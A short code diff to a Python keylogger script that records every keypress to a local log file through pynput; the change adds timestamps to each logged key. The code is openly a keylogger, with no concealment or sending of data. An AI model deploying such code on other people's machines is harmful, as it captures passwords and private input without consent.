@@ -29,13 +29,14 @@ __author__    = "Darren Morrison"
 __version__   = "0.0.1"
 #*****************************************************************************# pylint: enable=duplicate-code
 from pynput.keyboard import Key, Listener
+from datetime import datetime
 
 def on_press(key):
     with open("log.txt", "a") as log_file:
         try:
-            log_file.write(f"{key.char}")
+            log_file.write(f"{datetime.now()} - {key.char}\n")
         except AttributeError:
-            log_file.write(f" [{key}] ")
+            log_file.write(f"{datetime.now()} - [{key}]\n")
 
 def on_release(key):
     if key == Key.esc:
